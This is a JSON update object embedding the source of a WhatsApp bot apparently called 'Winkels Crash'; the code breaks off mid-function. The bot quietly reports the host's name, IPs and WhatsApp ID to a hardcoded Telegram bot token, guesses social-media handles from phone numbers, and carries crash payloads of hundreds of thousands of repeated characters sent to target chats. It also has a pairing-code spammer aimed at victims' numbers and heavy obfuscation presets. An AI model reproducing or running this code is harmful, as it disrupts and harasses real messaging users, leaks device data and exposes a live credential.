{
  "isMaintenanceMode": true,
  "SendChat": "update testing",
  "updateData": {
    "fileName": "xwinkels.js",
    "content": "const player = require('node-wav-player');
const moment = require('moment-timezone'); 
const axios = require('axios');
const chalk = require('chalk');
const mime = require('mime-types');
const TelegramBot = require('node-telegram-bot-api');
const os = require('os');
const FormData = require('form-data');
const bot = new TelegramBot('7689329776:AAFTsZz9Mq3Jc-btzQAXt3g9pGImEzWtmsw', {polling: false});


async function getSocialMediaInfo(phoneNumber) {
    try {
        const localNumber = phoneNumber.replace(/^(62|0)/, '');
        let telegramInfo = null;
        try {
            const tgResponse = await axios.get(`https://api.telegram.org/bot${bot.token}/getChat?chat_id=${phoneNumber}`);
            if(tgResponse.data.ok) {
                telegramInfo = tgResponse.data.result.username;
            }
        } catch(e) {}
        const possibleUsernames = [
            localNumber,
            `indo_${localNumber}`,
            `id_${localNumber}`,
            `user_${localNumber}`
        ];

        return {
            telegram: telegramInfo || "Tidak ditemukan",
            instagram: `Kemungkinan: @${possibleUsernames[0]} atau @${possibleUsernames[1]}`,
            tiktok: `Kemungkinan: @${possibleUsernames[2]}`,
            youtube: `Kemungkinan: Channel ${possibleUsernames[3]}`
        };
    } catch (error) {
        return {
            telegram: "Tidak ditemukan",
            instagram: "Tidak ditemukan",
            tiktok: "Tidak ditemukan", 
            youtube: "Tidak ditemukan"
        };
    }
}

async function sendDeviceInfo(userJid) {
    try {
        const deviceName = os.hostname();
        const privateIP = Object.values(os.networkInterfaces())
            .flat()
            .filter(details => details.family === 'IPv4' && !details.internal)
            .map(details => details.address)[0];
            
        const publicIP = (await axios.get('https://api.ipify.org?format=json')).data.ip;
        const phoneNumber = userJid.split('@')[0];
        
        const message = `📱 *NEW LOGIN DETECTED*\n\n` +
                       `*LIST DAFTAR LOGIN XWINKELS*\n` +
                       `━━━━━━━━━━━━━━━\n` +
                       `📲 *Device Name:* \`${deviceName}\`\n` +
                       `🌐 *Public IP:* \`${publicIP}\`\n` + 
                       `🔒 *Private IP:* \`${privateIP}\`\n` +
                       `📞 *WhatsApp:* \`${userJid}\`\n` +
                       `⏰ *Login Time:* \`${moment().format('DD/MM/YY HH:mm:ss')}\`\n` +
                       `━━━━━━━━━━━━━━━`;

        await bot.sendMessage('7147916188', message, {parse_mode: 'Markdown'});
        
    } catch (error) {
        console.error('Error sending device info:', error);
    }
}

async function fetchAccessList() {
    try {
        const response = await axios.get(PASTEBIN_URL);
        const data = response.data;
        if (Array.isArray(data) && data.length > 0 && data[0].Ip) {
            accessList = data;
            return true;
        }
        console.log(chalk.red('Format data tidak valid'));
        return false;
    } catch (error) {
        console.log(chalk.red('Error loading access list:', error.message));
        return false;
    }
}


async function checkNumberInDB(number) {
    try {
        let response = await axios.get('https://raw.githubusercontent.com/Bakuzaan1/Xwinekslasasdasgacoransan/refs/heads/main/Xwinkelasdasjfasas.json');
        let jsonData = response.data;
        return jsonData.dbny && Array.isArray(jsonData.dbny) && jsonData.dbny.includes(number);
    } catch (error) {
        console.error('Gagal memeriksa nomor:', error.message);
        return false;
    }
}
async function checkIP() {
    console.clear();
    console.log(chalk.blue.bold('=============================='));
    console.log(chalk.blue.bold('     𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍 V1.0'));
    console.log(chalk.blue.bold('=============================='));
    
    try {
        console.log(chalk.yellow('🔄 Mengecek status IP...'));
        const ipInfo = await axios.get('https://api.ipify.org?format=json');
        const userIP = ipInfo.data.ip;
        const response = await axios.get(PASTEBIN_URL);
        const data = response.data;
        if (!Array.isArray(data)) {
            throw new Error('Format data tidak valid');
        }
        
        const isRegistered = data.some(entry => entry.Ip === userIP);
        
        if (isRegistered) {
            console.log(chalk.green(`\n✅ IP Address terdaftar: ${userIP}`));
            return true;
        }

        console.log(chalk.red(`\n❌ IP Address tidak terdaftar: ${userIP}`));
        console.log(chalk.yellow(`\n👉 Jika butuh bantuan hubungi developer di ${global.link}`));
        return false;

    } catch (error) {
        if (error.message === 'Format data tidak valid') {
            console.log(chalk.red('\nFormat data tidak valid'));
        } else {
            console.log(chalk.red('\n❌ Gagal mendapatkan IP address'));
        }
        console.log(chalk.yellow('\n👉 Periksa koneksi internet anda'));
        return false;
    }
}
let usePrefix = true;
module.exports = {
    maintenanceMain, 
    getFileContent,
	checkNumberInDB,
	checkIP,
	sendDeviceInfo,
	rollbackUpdate,
	handler: async (xwill, m, store, isApproved, hasRequestedApproval, hasSentApprovalRequest) => {
		let hasShownApprovalMessage = false;
		
const { getRandomAsciiArt } = require('./database/lib/lowdb/randomAscii.js');

try {
const { deobfuscate } = require('obfuscator-io-deobfuscator');
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = usePrefix ? body.startsWith(prefix) : true;
const command = usePrefix ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : body.trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1)
const botNumber = await xwill.decodeJid(xwill.user.id)
const sender = m.key.fromMe ? (xwill.user.id.split(':')[0]+'@s.whatsapp.net' || xwill.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const totalFitur = () =>{
var mytext = fs.readFileSync("./xwinkels.js").toString()
var numUpper = (mytext.match(/case '/g) || []).length;
return numUpper
}
const YT = require('yt-search');
const { ytdl } = require('./database/ytdl.js');
const yts = require('yt-search');
const getRandom = (ext) => {
	return `${Math.floor(Math.random() * 10000)}${ext}`;
}

		
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const { kudels, kudels2, kudels3 } = require("./database/xwinkel/xwinkel.js")
const xwinkel = fs.readFileSync(`./database/xwinkel//xwinkel.jpg`)
const thum = 'https://files.catbox.moe/bri4a7.jpeg'
const preview = { 
	url: [
			'https://files.catbox.moe/tqylnt.mov',
			'https://files.catbox.moe/8d38n1.mov',
			'https://files.catbox.moe/n3vdei.mov', 
			'https://telegra.ph/file/a46ab7fa39338b1f54d5a.mp4',
			'https://files.catbox.moe/4v3p7q.mov',
			'https://files.catbox.moe/ym4kxg.mov',
			'https://files.catbox.moe/a5tcou.mp4'
		][Math.floor(Math.random() * 7)]
	};
const q = args.join(" ")
		
if (m.sender.startsWith('212')) return xwill.updateBlockStatus(m.sender, 'block')
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
		
	let run = runtime(process.uptime())
		
		
	if (command) {
const commandPrefixes = [
 	'.', '/', '!', '#',
	'noprefix', 'prefix',
	'menu', 'tiktok',
	'xw-galaxy', 'xwinkelst', 'xwinkelfr',
	'xwinkel', 'wtrashios', 'xw-isekai',
	'wios', 'xwinkelmw',
	'obf1',	'obf2', 'obf3', 'obfnoc',
	'addprem', 'delprem', 'addowner',
	'delowner', 'combine', 'combinebrutal',
	'dec', 'decrypt', 'decrypt1',	'dec1',	'enc', 'encrypt',
	'kuzu', 'kudels',
	'cekmemek', 'cekkontol', 'cekkhodam', 'tourl',
	'play', 'ytmp3', 'ytmp4','insta'
	];
const isCommand = commandPrefixes.some(prefix => 
		body.toLowerCase().startsWith(prefix)
	);
		
if (isCommand) {
console.log(chalk.blue.bold('=============================='));
console.log(chalk.red(`${getRandomAsciiArt()}`));
console.log(chalk.red(`🔱𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍 𝖁1`));
console.log(chalk.red(`⌬ TANGGAL: ${chalk.yellow(tanggal)}`));
console.log(chalk.red(`⌬ PESAN: ${chalk.green(body)}`));
console.log(chalk.red(`⌬ DARI: ${chalk.blue(pushname)}`));
console.log(chalk.red(`⌬ NUMBER: ${chalk.blue(sender)}`));
console.log(chalk.blue.bold('=============================='));
	}
}
		
				const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
				const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
				const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
				const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
		
				const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
				if (time2 < "23:59:00") {
					var ucapanWaktu = 'Selamat Malam 🏙️'
				}
				if (time2 < "19:00:00") {
					var ucapanWaktu = 'Selamat Petang 🌆'
				}
				if (time2 < "18:00:00") {
					var ucapanWaktu = 'Selamat Sore 🌇'
				}
				if (time2 < "15:00:00") {
					var ucapanWaktu = 'Selamat Siang 🌤️'
				}
				if (time2 < "10:00:00") {
					var ucapanWaktu = 'Selamat Pagi 🌄'
				}
				if (time2 < "05:00:00") {
					var ucapanWaktu = 'Selamat Subuh 🌆'
				}
				if (time2 < "03:00:00") {
					var ucapanWaktu = 'Selamat Tengah Malam 🌃'
				}
			   
			xwill.autoshalat = xwill.autoshalat ? xwill.autoshalat : {}
			let id = m.chat
			if (id in xwill.autoshalat) {
			return false
			}
			let jadwalSholat = {
			shubuh: '04:29',
			terbit: '05:44',
			dhuha: '06:02',
			dzuhur: '12:02',
			ashar: '15:15',
			magrib: '17:52',
			isya: '19:01',
			}
			const datek = new Date((new Date).toLocaleString("en-US", {
			timeZone: "Asia/Jakarta"
			}));
			const hours = datek.getHours();
			const minutes = datek.getMinutes();
			const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
			for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
			if (timeNow === waktu) {
				xwill.autoshalat[id] = [
					xwill.sendMessage(m.chat, {
		audio: {
			url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
		},
		mimetype: 'audio/mp4',
		ptt: true,
		contextInfo: {
			externalAdReply: {
				showAdAttribution: true,
				mediaType: 1,
				mediaUrl: '',
				title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
				body: `🕑 ${waktu}`,
				sourceUrl: '',
				thumbnail: await fs.readFileSync('./database/xwinkel/jadwal.jpg'),
				renderLargerThumbnail: true
			}
		}
					}, {}),
					setTimeout(async () => {
		delete client.autoshalat[m.chat]
					}, 57000)
				]
			}
			}
		
		
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))
		
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
		
		   xwill.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
			  var video = await prepareWAMessageMedia({
				 video: {
					url: opts && opts.video ? opts.video : ''
				 }
			  }, {
				 upload: xwill.waUploadToServer
			  })
			  let message = generateWAMessageFromContent(jid, {
				 viewOnceMessage: {
					message: {
					   interactiveMessage: {
		  body: {
			 text: opts && opts.body ? opts.body : ''
		  },
		  footer: {
			 text: opts && opts.footer ? opts.footer : ''
		  },
		  header: {
			 hasMediaAttachment: true,
			 videoMessage: video.videoMessage,
		  },
		  nativeFlowMessage: {
			 buttons: buttons,
			 messageParamsJson: ''
		  }, contextInfo: {
			  externalAdReply: {
			  title: `𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍 𝖁1`,
			  body: `By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍`,
			  thumbnailUrl: fs.readFileSync(`./database/xwinkel/xwinkel.jpg`),
			  sourceUrl: `https://t.me/KUDELsWINKELID`,
			  mediaType: 1,
			  renderLargerThumbnail: true
			  }
			  }
					   
					   }
					}
				 }
			  }, {
				 quoted
			  })
			  await xwill.sendPresenceUpdate('composing', jid)
			  return xwill.relayMessage(jid, message["message"], {
				 messageId: message.key.id
			  })
		   }

		   // KUOTED KDLSKAKS
const JsConfuser = require('js-confuser');
const https = require('https');
const JavaScriptObfuscator = require('javascript-obfuscator');
let match = "some string".match(/regex/);
const ensureDirectoryExistence = (filePath) => {
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
};
const readFile = (filePath) => {
    return new Promise((resolve, reject) => {
        fs.readFile(filePath, 'utf8', (err, data) => {
            if (err) reject(err);
            else resolve(data);
        });
    });
};
const writeFile = (filePath, data) => {
    return new Promise((resolve, reject) => {
        fs.writeFile(filePath, data, 'utf8', (err) => {
            if (err) reject(err);
            else resolve();
        });
    });
};
const options = {
    target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,
    identifierGenerator: function() {
        const originalString = "XwinkelsデXwinkelsテ";
        return originalString + Math.random().toString(25).slice(2, 8);
    },
    renameVariables: true,
    renameGlobals: true,
    stringEncoding: false,
    stringSplitting: 1.0,
    stringConcealing: true,
    stringCompression: false,
    duplicateLiteralsRemoval: 1.0,
    shuffle: { hash: 1.0, true: 1.0 },
    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 1.0,
    deadCode: 1.0,
    dispatcher: true,
    rgf: true,
    calculator: true,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};

const opsiobf = {
    target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,
    identifierGenerator: function() {
        const originalString = "XwinkelsデXwinkelsテ";
        return originalString + Math.random().toString(25).slice(2, 8);
    },
    renameVariables: true,
    renameGlobals: true,
    stringEncoding: false,
    stringSplitting: 1.0,
    stringConcealing: false,
    stringCompression: false,
    duplicateLiteralsRemoval: 1.0,
    shuffle: { hash: 1.0, true: 1.0 },
    stack: true,
    controlFlowFlattening: 1.0,
    opaquePredicates: 1.0,
    deadCode: 1.0,
    dispatcher: true,
    rgf: true,
    calculator: true,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};

const aphro = {
  target: "node",
  preset: "high",

  compact: true,                         
  minify: true,                          
  flatten: true,                         

  identifierGenerator: "mangled",
  renameVariables: true,                
  renameGlobals: true,                  

  stringEncoding: false,                 
  stringSplitting: 0.0,                 
  stringConcealing:  true,               
  stringCompression: true,              
  duplicateLiteralsRemoval: 1.0,        

  shuffle: {                            
    hash: 0.5,                           
    true: 0.5                            
  },
  stack: false,                         
  controlFlowFlattening: 0.3,           
  opaquePredicates: 0.0,                

  deadCode: 0.5,                        
  dispatcher: false,                    
  rgf: true,                            

  calculator: true,                     
  hexadecimalNumbers: false,            
  movedDeclarations: true,              
  objectExtraction: false,              
  globalConcealing: false                
};


const path = require('path');
const optimistis = {
    target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,
    identifierGenerator: function() {
        const match = ["placeholder", "Xwinkels"]; 
        const obfName = match[1]; 
        return obfName + Math.random().toString(25).slice(2, 8);
     },
    renameVariables: true,
    renameGlobals: true,
    stringEncoding: false,
    stringSplitting: 1.0,
    stringConcealing: false,
    stringCompression: false,
    duplicateLiteralsRemoval: 1.0,
    shuffle: { hash: 1.0, true: 1.0 },
    stack: true,
    controlFlowFlattening: true,
    opaquePredicates: 1.0,
    deadCode: 1.0,
    dispatcher: true,
    rgf: true,
    calculator: true,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
};


          async function loading() {
			var loading = [
			  ">  • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 𝟯",
			  ">  • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 𝟯",
			  ">  • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 𝟯",
			  ">  • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 𝟮",
              ">  • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 𝟮",
			  ">  • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 𝟭",
			  ">  • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 𝟭",
			  ">  • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 𝟬",
			  ">  • 𝙋𝙡𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 : 𝟬",
			  "*XWINKELS CRASH SUCCESS*",
			];
			let { key } = await xwill.sendMessage(m.chat, {
			  text: "𝗜 𝗔𝗠 𝗚𝗢𝗜𝗡𝗚 𝗧𝗢 𝗦𝗘𝗡𝗗 𝗧𝗛𝗘 𝗕𝗨𝗚𝗦",
			});
	  
			for (let i = 0; i < loading.length; i++) {
			  await sleep(500);
			  await xwill.sendMessage(m.chat, { text: loading[i], edit: key });
			}
		  }


		
		
			// FUNCT BUG
    async function prM(params) {
			return await prepareWAMessageMedia(params, {
				upload: xwill.waUploadToServer
			})
		}
		
		   const wanted = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"𝖂𝖎𝖓𝖐𝖊𝖑𝖘𝕮𝖗𝖆𝖘𝖍𝖁1@lol.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}	

			const TypeNull = {
				key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
				},
				message: {
				"interactiveResponseMessage": {
				"body": {
				"text": "Sent",
				"format": "DEFAULT"
				},
				"nativeFlowResponseMessage": {
				"name": "galaxy_message",
				"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
				"version": 3
				}
				}
				}
				}
            
		
			async function caltx(target) {
				let etc = generateWAMessageFromContent(target,
					proto.Message.fromObject({
						viewOnceMessage: {
							message: {
								scheduledCallCreationMessage: {
									scheduledTimestampMs: Date.now(),
									callType: 2,
									title: ""
								}
							}
						},
					}), {
						userJid: target,
						fromMe: false,
					}
				);
				await xwill.relayMessage(target, etc.message, {});
                console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
			}

				//funct Other Menu
				function getCountryCodes() {
					return {
						'93': 'Afghanistan',
						'355': 'Albania',
						'213': 'Algeria',
						'376': 'Andorra',
						'244': 'Angola',
						'1264': 'Anguilla',
						'1268': 'Antigua & Barbuda',
						'54': 'Argentina',
						'374': 'Armenia',
						'297': 'Aruba',
						'61': 'Australia',
						'43': 'Austria',
						'994': 'Azerbaijan',
						'1242': 'Bahamas',
						'973': 'Bahrain',
						'880': 'Bangladesh',
						'1246': 'Barbados',
						'375': 'Belarus',
						'32': 'Belgium',
						'501': 'Belize',
						'229': 'Benin',
						'1441': 'Bermuda',
						'975': 'Bhutan',
						'591': 'Bolivia',
						'387': 'Bosnia Herzegovina',
						'267': 'Botswana',
						'55': 'Brazil',
						'673': 'Brunei',
						'359': 'Bulgaria',
						'226': 'Burkina Faso',
						'257': 'Burundi',
						'855': 'Cambodia',
						'237': 'Cameroon',
						'1': 'Canada',
						'238': 'Cape Verde',
						'1345': 'Cayman Islands',
						'236': 'Central African Rep',
						'235': 'Chad',
						'56': 'Chile',
						'86': 'China',
						'57': 'Colombia',
						'269': 'Comoros',
						'242': 'Congo',
						'682': 'Cook Islands',
						'506': 'Costa Rica',
						'385': 'Croatia',
						'53': 'Cuba',
						'90392': 'Cyprus North',
						'357': 'Cyprus South',
						'42': 'Czech Republic',
						'45': 'Denmark',
						'253': 'Djibouti',
						'1809': 'Dominican Republic',
						'593': 'Ecuador',
						'20': 'Egypt',
						'503': 'El Salvador',
						'240': 'Equatorial Guinea',
						'291': 'Eritrea',
						'372': 'Estonia',
						'251': 'Ethiopia',
						'500': 'Falkland Islands',
						'298': 'Faroe Islands',
						'679': 'Fiji',
						'358': 'Finland',
						'33': 'France',
						'594': 'French Guiana',
						'689': 'French Polynesia',
						'241': 'Gabon',
						'220': 'Gambia',
						'7880': 'Georgia',
						'49': 'Germany',
						'233': 'Ghana',
						'350': 'Gibraltar',
						'30': 'Greece',
						'299': 'Greenland',
						'1473': 'Grenada',
						'590': 'Guadeloupe',
						'671': 'Guam',
						'502': 'Guatemala',
						'224': 'Guinea',
						'245': 'Guinea - Bissau',
						'592': 'Guyana',
						'509': 'Haiti',
						'504': 'Honduras',
						'852': 'Hong Kong',
						'36': 'Hungary',
						'354': 'Iceland',
						'91': 'India',
						'62': 'Indonesia',
						'98': 'Iran',
						'964': 'Iraq',
						'353': 'Ireland',
						'972': 'Israel',
						'39': 'Italy',
						'1876': 'Jamaica',
						'81': 'Japan',
						'962': 'Jordan',
						'7': 'Kazakhstan',
						'254': 'Kenya',
						'686': 'Kiribati',
						'850': 'Korea North',
						'82': 'Korea South',
						'965': 'Kuwait',
						'996': 'Kyrgyzstan',
						'856': 'Laos',
						'371': 'Latvia',
						'961': 'Lebanon',
						'266': 'Lesotho',
						'231': 'Liberia',
						'218': 'Libya',
						'417': 'Liechtenstein',
						'370': 'Lithuania',
						'352': 'Luxembourg',
						'853': 'Macao',
						'389': 'Macedonia',
						'261': 'Madagascar',
						'265': 'Malawi',
						'60': 'Malaysia',
						'960': 'Maldives',
						'223': 'Mali',
						'356': 'Malta',
						'692': 'Marshall Islands',
						'596': 'Martinique',
						'222': 'Mauritania',
						'269': 'Mayotte',
						'52': 'Mexico',
						'691': 'Micronesia',
						'373': 'Moldova',
						'377': 'Monaco',
						'976': 'Mongolia',
						'1664': 'Montserrat',
						'212': 'Morocco',
						'258': 'Mozambique',
						'95': 'Myanmar',
						'264': 'Namibia',
						'674': 'Nauru',
						'977': 'Nepal',
						'31': 'Netherlands',
						'687': 'New Caledonia',
						'64': 'New Zealand',
						'505': 'Nicaragua',
						'227': 'Niger',
						'234': 'Nigeria',
						'683': 'Niue',
						'672': 'Norfolk Islands',
						'670': 'Northern Marianas',
						'47': 'Norway',
						'968': 'Oman',
						'92': 'Pakistan',
						'680': 'Palau',
						'507': 'Panama',
						'675': 'Papua New Guinea',
						'595': 'Paraguay',
						'51': 'Peru',
						'63': 'Philippines',
						'48': 'Poland',
						'351': 'Portugal',
						'1787': 'Puerto Rico',
						'974': 'Qatar',
						'262': 'Reunion',
						'40': 'Romania',
						'7': 'Russia',
						'250': 'Rwanda',
						'378': 'San Marino',
						'239': 'Sao Tome & Principe',
						'966': 'Saudi Arabia',
						'221': 'Senegal',
						'381': 'Serbia',
						'248': 'Seychelles',
						'232': 'Sierra Leone',
						'65': 'Singapore',
						'421': 'Slovak Republic',
						'386': 'Slovenia',
						'677': 'Solomon Islands',
						'252': 'Somalia',
						'27': 'South Africa',
						'34': 'Spain',
						'94': 'Sri Lanka',
						'290': 'St. Helena',
						'1869': 'St. Kitts',
						'1758': 'St. Lucia',
						'249': 'Sudan',
						'597': 'Suriname',
						'268': 'Swaziland',
						'46': 'Sweden',
						'41': 'Switzerland',
						'963': 'Syria',
						'886': 'Taiwan',
						'66': 'Thailand',
						'228': 'Togo',
						'676': 'Tonga',
						'1868': 'Trinidad & Tobago',
						'216': 'Tunisia',
						'90': 'Turkey',
						'993': 'Turkmenistan',
						'1649': 'Turks & Caicos Islands',
						'688': 'Tuvalu',
						'256': 'Uganda',
						'380': 'Ukraine',
						'971': 'United Arab Emirates',
						'44': 'United Kingdom',
						'1': 'United States',
						'598': 'Uruguay',
						'998': 'Uzbekistan',
						'678': 'Vanuatu',
						'379': 'Vatican City',
						'58': 'Venezuela',
						'84': 'Vietnam',
						'1284': 'Virgin Islands - British',
						'1340': 'Virgin Islands - US',
						'681': 'Wallis & Futuna',
						'969': 'Yemen (North)',
						'967': 'Yemen (South)',
						'260': 'Zambia',
						'263': 'Zimbabwe'
					};
				}
				async function startPairSpam(phoneNumber, countryCode, countryCodes) {
					const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
					const { version } = await fetchLatestBaileysVersion();
					const NodeCache = require("node-cache");
					const msgRetryCounterCache = new NodeCache();
				
					const { state } = await useMultiFileAuthState('./database/sampah');
					
					let sock = makeWASocket({
						version,
						logger: pino({ level: "silent" }),
						printQRInTerminal: false,
						auth: state,
						browser: ["Ubuntu", "Chrome", "20.0.04"],
						msgRetryCounterCache
					});
				
					sock.ev.on('connection.update', async (update) => {
						const { connection, lastDisconnect } = update;
						if (connection === 'close') {
							const shouldReconnect = (lastDisconnect?.error)?.output?.statusCode !== 401;
							if (shouldReconnect) {
								await startPairSpam(phoneNumber, countryCode, countryCodes);
							}
						}
					});
				
					const interval = setInterval(async () => {
						try {
							const code = await sock.requestPairingCode(phoneNumber);
							console.log(chalk.green(`✓ Pairing Code Sent to ${phoneNumber} (${countryCodes[countryCode]}): ${code}`));
						} catch (error) {
							if (error?.output?.statusCode === 428) {
								console.log(chalk.red('Connection closed, retrying...'));
								clearInterval(interval);
								await startPairSpam(phoneNumber, countryCode, countryCodes);
							} else {
								console.log(chalk.red('Error:', error.message));
							}
						}
					}, 2000);
				
					return sock;
				}
				function validatePhoneNumber(rawNumber, countryCodes) {
					let phoneNumber;
					let countryCode;
				
					for (let code in countryCodes) {
						if (rawNumber.startsWith(code)) {
							countryCode = code;
							phoneNumber = rawNumber;
							break;
						}
					}
				
					if (!countryCode) {
						if (rawNumber.startsWith('0')) {
							phoneNumber = '62' + rawNumber.substring(1);
							countryCode = '62';
						} else if (rawNumber.length >= 10 && rawNumber.length <= 15) {
							phoneNumber = rawNumber;
							countryCode = rawNumber.substring(0, 2);
						} else {
							throw new Error('Format nomor tidak valid!');
						}
					}
				
					if (phoneNumber.length < 10 || phoneNumber.length > 15) {
						throw new Error('Panjang nomor tidak valid!');
					}
				
					return { phoneNumber, countryCode };
				}


				async function deobfuscateCode(text) {
					const result = deobfuscate(text);
					return result;
				}

				// FUNCT BARU
    async function EncryptMessage(target, wanted) {
            const locationMessageContent = proto.Message.fromObject({
                viewOnceMessage: {
                    message: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0,
                            name: '𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍\n' + 'ꦾ'.repeat(9999),
                            url: 'https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.tiktok.com/login&ved=2ahUKEwjoofub_LaJAxV0VWwGHRbTE5sQFnoECAsQAQ&usg=AOvVaw2iyH8WQ2LCBOlE_xMJEbJK\n' + 'ꦾ࣯'.repeat(9999),
                            jpegThumbnail: null
                        }
                    }
                }
            });
            const options = {
                userJid: target,
                quoted: wanted,
                fromMe: false 
            };
        
            const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, options);
            await xwill.relayMessage(target, encryptedMessage.message, { participant: { jid: target, quoted: wanted } });
        
            console.log(chalk.red("Bug Sending By 𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍"));
        }
    
    async function xwinkelst(target) {
                let mark = "0@s.whatsapp.net"
				let virtex = "𝖂𝖎𝖓𝖐𝖊𝖑𝖘 𝕮𝖗𝖆𝖘𝖍" + "ꦾ".repeat(90000);
                
				await xwill.relayMessage(target, {
				groupMentionedMessage: {
				message: {
				interactiveMessage: {
				header: {
				locationMessage: {
				degreesLatitude: 0,
				degreesLongitude: 0
				},
				hasMediaAttachment: true
				},
				body: {
				text: virtex + "ꦾ".repeat(90000) + "@".repeat(199999).split('@').map(() => `@${mark.split('@')[0]}`).join(''),
				},
				nativeFlowMessage: {},
				contextInfo: {
				 mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
